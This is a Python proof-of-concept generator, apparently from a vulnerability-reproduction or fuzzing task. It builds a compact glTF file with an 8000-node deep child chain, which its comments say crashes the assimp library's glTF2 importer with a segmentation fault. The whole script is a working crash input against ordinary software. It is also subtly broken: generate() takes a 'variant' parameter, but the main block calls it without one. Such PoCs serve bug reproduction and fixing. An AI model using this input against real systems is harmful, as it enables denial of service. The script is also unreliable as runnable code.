#!/usr/bin/env python3
"""
POV Generator Script

This script generates the POV binary that triggers the vulnerability.
Run: python3 gen_blob.py > pov.bin
"""

def generate(variant: int) -> bytes:
    import json
    # PoC: compact glTF JSON with a deep node chain (8000 nodes) under 1MB.
    # This triggers an ASan-detectable SEGV in glTF2Asset::Retrieve during import
    # in the assimp_fuzzer harness.
    depth = 8000
    nodes = []
    for i in range(depth):
        n = {"name": "A"}
        if i + 1 < depth:
            n["children"] = [i+1]
        nodes.append(n)
    nodes[-1]["camera"] = 0
    gltf = {
        "asset": {"version": "2.0"},
        "scene": 0,
        "scenes": [{"nodes": [0]}],
        "nodes": nodes,
        "cameras": [{"type": "perspective", "perspective": {"yfov": 0.7, "znear": 0.1}}]
    }
    return json.dumps(gltf, separators=(',',':')).encode('utf-8')


if __name__ == "__main__":
    import sys
    data = generate()
    sys.stdout.buffer.write(data)
